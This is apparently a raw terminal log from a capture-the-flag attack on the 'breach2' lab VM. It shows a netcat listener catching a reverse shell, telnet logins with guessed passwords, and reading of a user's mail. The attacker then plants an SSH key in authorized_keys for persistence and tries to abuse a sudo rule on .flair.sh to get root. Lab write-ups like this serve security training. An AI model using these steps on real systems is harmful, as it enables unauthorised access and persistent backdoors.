25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

$ cd /home/milton
cd /home/milton
$ ls
ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
$ ls -la
ls -la
total 120
drwxr-xr-x 16 milton milton  4096 Jun 19 16:42 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 15 18:25 .flair.sh
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
$ cd Documents
cd Documents
$ ls
ls
$ cd ..
cd ..
$ cat .flair.sh
cat .flair.sh
#!/bin/bash

service nginx start
$ sud milton
sud milton
/bin/sh: 47: sud: not found
$ su milton
su milton
Password: coffeestains

su: Module is unknown
$ pwd
pwd
/home/milton
$ ls -la
ls -la
total 120
drwxr-xr-x 16 milton milton  4096 Jun 19 16:42 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 15 18:25 .flair.sh
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
$ netst 
netst 
/bin/sh: 51: netst: not found
$ netstat
netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      






a
a
tcp        0    124 192.168.110.151:35443   192.168.110.128:4780    ESTABLISHED
tcp        0      0 192.168.110.151:34681   192.168.110.128:4444    ESTABLISHED
tcp        0      0 192.168.110.151:43415   192.168.110.128:1390    ESTABLISHED
udp        0      0 192.168.110.151:56018   192.168.72.2:domain     ESTABLISHED
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ]         DGRAM                    7710     /run/systemd/notify
unix  2      [ ]         DGRAM                    7728     /run/systemd/shutdownd
unix  6      [ ]         DGRAM                    7730     /run/systemd/journal/dev-log
unix  5      [ ]         DGRAM                    7739     /run/systemd/journal/socket
unix  2      [ ]         DGRAM                    8181     /run/systemd/journal/syslog
unix  3      [ ]         STREAM     CONNECTED     10952    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     11205    
unix  2      [ ]         DGRAM                    10962    
unix  3      [ ]         STREAM     CONNECTED     10739    /run/systemd/journal/stdout
unix  2      [ ]         STREAM     CONNECTED     79325    
unix  3      [ ]         STREAM     CONNECTED     10910    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     11206    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     11047    
unix  2      [ ]         DGRAM                    8312     
unix  3      [ ]         STREAM     CONNECTED     10951    
unix  2      [ ]         DGRAM                    11017    
unix  3      [ ]         STREAM     CONNECTED     10609    
unix  3      [ ]         STREAM     CONNECTED     10738    
unix  3      [ ]         STREAM     CONNECTED     79341    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     10654    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     10610    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    9892     
unix  3      [ ]         STREAM     CONNECTED     11049    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     11050    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     10968    
unix  2      [ ]         DGRAM                    8185     
unix  3      [ ]         STREAM     CONNECTED     11038    
unix  2      [ ]         DGRAM                    11222    
unix  3      [ ]         STREAM     CONNECTED     10324    
unix  3      [ ]         DGRAM                    8323     
unix  3      [ ]         STREAM     CONNECTED     11422    
unix  3      [ ]         STREAM     CONNECTED     10653    
unix  3      [ ]         STREAM     CONNECTED     79340    
unix  3      [ ]         STREAM     CONNECTED     10325    
unix  3      [ ]         STREAM     CONNECTED     10955    
unix  3      [ ]         STREAM     CONNECTED     79335    
unix  3      [ ]         STREAM     CONNECTED     11421    
unix  3      [ ]         STREAM     CONNECTED     11039    
unix  2      [ ]         DGRAM                    11245    
unix  3      [ ]         STREAM     CONNECTED     10909    
unix  3      [ ]         DGRAM                    8324     
unix  3      [ ]         STREAM     CONNECTED     11048    
unix  3      [ ]         STREAM     CONNECTED     79334    
$ $ $ $ /bin/sh: 56: a: not found
$ netstat -lnt
netstat -lnt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:49235           0.0.0.0:*               LISTEN     
tcp6       0      0 ::1:25                  :::*                    LISTEN     
tcp6       0      0 :::111                  :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::51254                :::*                    LISTEN     
$ telnet localhost 2323
telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W 
breach2 login: 

Password: 


Login incorrect
breach2 login: 

Password: 


Login incorrect


$ netstat -lnt
netstat -lnt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:49235           0.0.0.0:*               LISTEN     
tcp6       0      0 ::1:25                  :::*                    LISTEN     
tcp6       0      0 :::111                  :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::51254                :::*                    LISTEN     
$ telnet localhost 2323
telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W 
breach2 login: 

Password: 


Login incorrect
breach2 login: 

Password: 


Login incorrect
breach2 login: Connection closed by foreign host.
$ 

$ telnet 127.0.0.1 2323
telnet 127.0.0.1 2323
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
29 45'46" N 95 22'59" W 
breach2 login: milton
milton
Password: coffeestains


Login incorrect
breach2 login: peter
peter
Password: inthesource

Last login: Sat Jun 25 11:44:26 EDT 2016 from 192.168.110.128 on pts/0
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
29 45'46" N 95 22'59" W 
You have new mail.
peter@breach2:~$ mail
mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
"/var/mail/peter": 1160 messages 1160 new
>N  1 blumbergh@breach2  Wed Jun 15 16:42   18/648   *** SECURITY information fo
 N  2 blumbergh@breach2  Wed Jun 15 16:42   18/648   *** SECURITY information fo
 N  3 root@breach2       Thu Jun 16 13:10   37/1199  Cron <peter@breach2> cd /ho
 N  4 root@breach2       Thu Jun 16 13:11   46/1886  Cron <peter@breach2> cd /ho
 N  5 root@breach2       Thu Jun 16 13:20   47/1931  Cron <peter@breach2> cd /ho
 N  6 root@breach2       Thu Jun 16 13:24   47/1931  Cron <peter@breach2> cd /ho
 N  7 root@breach2       Thu Jun 16 13:25   37/1199  Cron <peter@breach2> cd /ho
 N  8 root@breach2       Sat Jun 18 12:01   46/1886  Cron <peter@breach2> cd /ho
 N  9 root@breach2       Sat Jun 18 12:10   37/1199  Cron <peter@breach2> cd /ho
 N 10 root@breach2       Sat Jun 18 12:15   37/1199  Cron <peter@breach2> cd /ho
 N 11 root@breach2       Sat Jun 18 12:20   37/1199  Cron <peter@breach2> cd /ho
 N 12 root@breach2       Sat Jun 18 12:25   37/1199  Cron <peter@breach2> cd /ho
 N 13 root@breach2       Sat Jun 18 12:30   37/1199  Cron <peter@breach2> cd /ho
 N 14 root@breach2       Sat Jun 18 12:35   37/1199  Cron <peter@breach2> cd /ho
 N 15 root@breach2       Sat Jun 18 12:40   37/1199  Cron <peter@breach2> cd /ho
 N 16 root@breach2       Sat Jun 18 12:45   37/1199  Cron <peter@breach2> cd /ho
 N 17 root@breach2       Sat Jun 18 12:50   37/1199  Cron <peter@breach2> cd /ho
 N 18 root@breach2       Sat Jun 18 12:55   37/1199  Cron <peter@breach2> cd /ho
 N 19 root@breach2       Sat Jun 18 13:00   37/1199  Cron <peter@breach2> cd /ho
 N 20 root@breach2       Sat Jun 18 13:05   37/1199  Cron <peter@breach2> cd /ho
& 1
1
Message 1:
From blumbergh@breach2 Wed Jun 15 16:42:30 2016
Envelope-to: root@breach2
Delivery-date: Wed, 15 Jun 2016 16:42:30 -0400
To: root@breach2
Auto-Submitted: auto-generated
Subject: *** SECURITY information for breach2 ***
From:  <blumbergh@breach2>
Date: Wed, 15 Jun 2016 16:42:09 -0400

breach2 : Jun 15 16:41:49 : blumbergh : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/python


& 2
2
Message 2:
From blumbergh@breach2 Wed Jun 15 16:42:49 2016
Envelope-to: root@breach2
Delivery-date: Wed, 15 Jun 2016 16:42:49 -0400
To: root@breach2
Auto-Submitted: auto-generated
Subject: *** SECURITY information for breach2 ***
From:  <blumbergh@breach2>
Date: Wed, 15 Jun 2016 16:42:29 -0400

breach2 : Jun 15 16:42:09 : blumbergh : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/python


& 3
3
WARNING: terminal is not fully functional
-  (press RETURN)
Message 3:
From peter@breach2 Thu Jun 16 13:10:58 2016
Envelope-to: peter@breach2
Delivery-date: Thu, 16 Jun 2016 13:10:58 -0400
From: root@breach2 (Cron Daemon)
To: peter@breach2
Subject: Cron <peter@breach2> cd /home/peter && ./firefox.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/home/peter>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=peter>
Date: Thu, 16 Jun 2016 13:10:38 -0400


(EE) 
Fatal server error:
(EE) Server is already active for display 0
        If this server is no longer running, remove /tmp/.X0-lock
        and start again.
(EE) 
:
(EE) 
:
Please consult the The X.Org Foundation support 
:
         at http://wiki.x.org
:

 for help. 
:
(EE) 
:
XIO:  fatal IO error 11 (Resource temporarily unavailable) on X server ":0"
:
      after 7 requests (7 known processed) with 0 events remaining.
:
kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill 
:
-l [sigspec]
:

:
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)
(END)q
& WARNING: terminal is not fully functional
-  (press RETURN)
Message 4:
From peter@breach2 Thu Jun 16 13:11:05 2016
Envelope-to: peter@breach2
Delivery-date: Thu, 16 Jun 2016 13:11:05 -0400
From: root@breach2 (Cron Daemon)
To: peter@breach2
Subject: Cron <peter@breach2> cd /home/peter && ./firefox.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/home/peter>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=peter>
Date: Thu, 16 Jun 2016 13:10:45 -0400



X.Org X Server 1.16.4
Release Date: 2014-12-20
X Protocol Version 11, Revision 0
Build Operating System: Linux 3.16.0-4-amd64 x86_64 Debian
Current Operating System: Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt2
:q
& WARNING: terminal is not fully functional
-  (press RETURN)
Message 5:
From peter@breach2 Thu Jun 16 13:20:41 2016
Envelope-to: peter@breach2
Delivery-date: Thu, 16 Jun 2016 13:20:41 -0400
From: root@breach2 (Cron Daemon)
To: peter@breach2
Subject: Cron <peter@breach2> cd /home/peter && ./firefox.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/home/peter>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=peter>
Date: Thu, 16 Jun 2016 13:20:21 -0400



X.Org X Server 1.16.4
Release Date: 2014-12-20
X Protocol Version 11, Revision 0
Build Operating System: Linux 3.16.0-4-amd64 x86_64 Debian
Current Operating System: Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt2
:
5-2 (2016-04-08) x86_64
: qqq
Kernel command line: BOOT_IMAGE=/boot/vmlinuz-3.16.0-4-amd64 root=UUID=582f8ce4-
8466-452f-a9c1-46e6c506efa3 ro quiet
Build Date: 11 February 2015  12:32:02AM
xorg-server 2:1.16.4-1 (http://www.debian.org/support) 
Current version of pixman: 0.32.6
        Before reporting problems, check http://wiki.x.org
        to make sure that you have the latest version.
Markers: (--) probed, (**) from config file, (==) default setting,
        (++) from command line, (!!) notice, (II) informational,
        (WW) warning, (EE) error, (NI) not implemented, (??) unknown.
(==) Log file: "/var/log/Xorg.0.log", Time: Thu Jun 16 13:15:01 2016
(==) Using system config directory "/usr/share/X11/xorg.conf.d"
VMware: No 3D enabled (0, Success).
(II) VMWARE(0): vmmouse enable absolute mode
xinit: connection to X server lost

waiting for X server to shut down (EE) Server terminated successfully (0). Closi
ng log file.

kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill 
-l [sigspec]

& Unknown command: "qq"
& q
q
New mail has arrived.
Saved 5 messages in /home/peter/mbox
Held 1155 messages in /var/mail/peter
You have mail in /var/mail/peter
peter@breach2:~$ mail
mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
"/var/mail/peter": 1156 messages 1 new 1156 unread
 U1141 root@breach2       Sat Jun 25 11:30   27/1021  Cron <peter@breach2> cd /h
 U1142 root@breach2       Sat Jun 25 11:35   27/1021  Cron <peter@breach2> cd /h
 U1143 root@breach2       Sat Jun 25 11:40   27/1021  Cron <peter@breach2> cd /h
 U1144 root@breach2       Sat Jun 25 11:45   27/1022  Cron <peter@breach2> cd /h
 U1145 root@breach2       Sat Jun 25 11:45   27/1021  Cron <peter@breach2> cd /h
 U1146 root@breach2       Sat Jun 25 11:50   27/1021  Cron <peter@breach2> cd /h
 U1147 root@breach2       Sat Jun 25 11:55   27/1021  Cron <peter@breach2> cd /h
 U1148 root@breach2       Sat Jun 25 12:00   27/1021  Cron <peter@breach2> cd /h
 U1149 root@breach2       Sat Jun 25 12:00   24/877   Cron <peter@breach2> cd /h
 U1150 root@breach2       Sat Jun 25 12:05   27/1021  Cron <peter@breach2> cd /h
 U1151 root@breach2       Sat Jun 25 12:10   27/1021  Cron <peter@breach2> cd /h
 U1152 root@breach2       Sat Jun 25 12:15   27/1021  Cron <peter@breach2> cd /h
 U1153 root@breach2       Sat Jun 25 12:20   27/1021  Cron <peter@breach2> cd /h
 U1154 root@breach2       Sat Jun 25 12:25   27/1021  Cron <peter@breach2> cd /h
 U1155 root@breach2       Sat Jun 25 12:25   27/1022  Cron <peter@breach2> cd /h
>N1156 root@breach2       Sat Jun 25 12:30   26/1011  Cron <peter@breach2> cd /h
& ?
?
WARNING: terminal is not fully functional
/usr/share/bsd-mailx/mail.help  (press RETURN)
Mail Command                    Description
-------------------------       --------------------------------------------
t [message list]                type message(s).
more [message list]             read message(s), through the $PAGER
n                               goto and type next message.
e [message list]                edit message(s).
f [message list]                give head lines of messages.
d [message list]                delete message(s).
s [message list] <file>         append message(s) to file.
u [message list]                undelete message(s).
R [message list]                reply to message sender(s).
r [message list]                reply to message sender(s) and all recipients.
p [message list]                print message list.
pre [message list]              make messages go back to /var/mail.
m <recipient list>              mail to specific recipient(s).
q                               quit, saving unresolved messages in mbox.
x                               quit, do not remove system mailbox.
h                               print out active message headers.
!                               shell escape.
| [msglist] command             pipe message(s) to shell command.
pi [msglist] command            pipe message(s) to shell command.
cd [directory]                  chdir to directory or home if none given
fi <file>                       switch to file (%=system inbox, %user=user's
/usr/share/bsd-mailx/mail.help
                                system inbox).  + searches in your folder
:
                                directory for the file.
:q
& At EOF

## visit members page to trigger exploit. Then you have a shell:

oot@kali:~/.ssh# nc -lvp 4780
listening on [any] 4780 ...
192.168.110.151: inverse host lookup failed: Unknown host
connect to [192.168.110.128] from (UNKNOWN) [192.168.110.151] 35449
python -c 'import pty; pty.spawn("/bin/sh")'
$ telnet localhost 2323
telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W 
breach2 login: milton
milton
Password: houston


Login incorrect
breach2 login: milton
milton
Password: houston


Login incorrect
breach2 login: 

Password: 


Login incorrect
breach2 login: 

Password: ^]

telnet> quit
quit
Connection closed.
$ grep milt /etc/passwd
grep milt /etc/passwd
milton:x:1002:1002::/home/milton:/bin/bash
$ netstat -lntp
netstat -lntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:49235           0.0.0.0:*               LISTEN      -               
tcp6       0      0 ::1:25                  :::*                    LISTEN      -               
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::51254                :::*                    LISTEN      -               
$ telnet localhost 2323
telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W 
breach2 login: milton
milton
Password: Houston

Last login: Sat Jun 18 18:53:07 EDT 2016 on :0
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
29 45'46" N 95 22'59" W 
milton@breach2:~$ ls
ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
milton@breach2:~$ cd .ssh
cd .ssh
-bash: cd: .ssh: No such file or directory
milton@breach2:~$ mkdir .ssh
mkdir .ssh
milton@breach2:~$ chmod 700 .ssh
chmod 700 .ssh
milton@breach2:~$ ls -l .ssh
ls -l .ssh
total 0
milton@breach2:~$ ls -ld .ssh
ls -ld .ssh
drwx------ 2 milton milton 4096 Jun 26 05:27 .ssh
milton@breach2:~$ cd .ssh
cd .ssh
milton@breach2:~/.ssh$ which vim
which vim
milton@breach2:~/.ssh$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDliuhL8SZO4RWenmoTc1nLtKr8lpwb8QETop8tw+TEpXqfUEOKN5yKncWGqOava5J034bMyGHTOj+yI5FDAVbkRzE9MIF5IOKgppg/skx3iFI8MB25NiDfRhjx0t3Xxiu+DfjVGe2zqucOzsC8pWSxUlMTL6jOkPaO/eeyN1Qr0yIrECpvQ78/ilsUKnUDXpYpp04makpbnl0j7mjb4+bO5UlrwKav07RwbU1X+OOVRR7+UPRtnyMlAf41zSPjhuCfmceCXf3zXKu3b9zPeGNvdB31hH9q/sq12sUPn1MTgO3WzjImAXghz3v8ypvLvhK3G74OH4Pya/w7QlHKATTB root@kali > authorized_keys
<O3WzjImAXghz3v8ypvLvhK3G74OH4Pya/w7QlHKATTB root@kali > authorized_keys     
milton@breach2:~/.ssh$ ls -l
ls -l
total 4
-rw-r--r-- 1 milton milton 391 Jun 26 05:29 authorized_keys
milton@breach2:~/.ssh$ chmod 600 authorized_keys
chmod 600 authorized_keys
milton@breach2:~/.ssh$ ls
ls
authorized_keys
milton@breach2:~/.ssh$ cd
cd
milton@breach2:~$ la
la
-bash: la: command not found
milton@breach2:~$ ls -la
ls -la
total 124
drwxr-xr-x 17 milton milton  4096 Jun 26 05:27 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 15 18:25 .flair.sh
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwx------  2 milton milton  4096 Jun 26 05:29 .ssh
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
milton@breach2:~$ sudo -l
sudo -l
Matching Defaults entries for milton on breach2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User milton may run the following commands on breach2:
    (root) NOPASSWD: /bin/sh .flair.sh
milton@breach2:~$ ls -l
ls -l
total 32
drwxr-xr-x 2 milton milton 4096 Jun 18 18:22 Desktop
drwxr-xr-x 2 milton milton 4096 Jun 18 18:22 Documents
drwxr-xr-x 2 milton milton 4096 Jun 18 18:22 Downloads
drwxr-xr-x 2 milton milton 4096 Jun 18 18:22 Music
drwxr-xr-x 2 milton milton 4096 Jun 18 18:22 Pictures
drwxr-xr-x 2 milton milton 4096 Jun 18 18:22 Public
drwxr-xr-x 2 milton milton 4096 Jun 18 18:22 Templates
drwxr-xr-x 2 milton milton 4096 Jun 18 18:22 Videos
milton@breach2:~$ ls -la
ls -la
total 124
drwxr-xr-x 17 milton milton  4096 Jun 26 05:27 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 15 18:25 .flair.sh
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwx------  2 milton milton  4096 Jun 26 05:29 .ssh
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
milton@breach2:~$ cp .flair.sh .flair.sh.old
cp .flair.sh .flair.sh.old
milton@breach2:~$ ls -la
ls -la
total 128
drwxr-xr-x 17 milton milton  4096 Jun 26 05:31 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 15 18:25 .flair.sh
-rwxr-xr-x  1 milton milton    33 Jun 26 05:31 .flair.sh.old
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwx------  2 milton milton  4096 Jun 26 05:29 .ssh
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
milton@breach2:~$ cat .flair.sh
cat .flair.sh
#!/bin/bash

service nginx start
milton@breach2:~$ echo #!/bin/bash\n/bin.sh >.flair.sh   
echo #!/bin/bash\n/bin.sh >.flair.sh

milton@breach2:~$ cat .flair.sh
cat .flair.sh
#!/bin/bash

service nginx start
milton@breach2:~$ cd /tmp
cd /tmp
milton@breach2:/tmp$ echo #!/bin/bash\n/bin.sh >.flair.sh
echo #!/bin/bash\n/bin.sh >.flair.sh

milton@breach2:/tmp$ touch .flair.sh
touch .flair.sh
milton@breach2:/tmp$ ls -l *.sh
ls -l *.sh
ls: cannot access *.sh: No such file or directory
milton@breach2:/tmp$ cd
cd
milton@breach2:~$ ls
ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
milton@breach2:~$ ls -la
ls -la
total 128
drwxr-xr-x 17 milton milton  4096 Jun 26 05:31 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 15 18:25 .flair.sh
-rwxr-xr-x  1 milton milton    33 Jun 26 05:31 .flair.sh.old
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
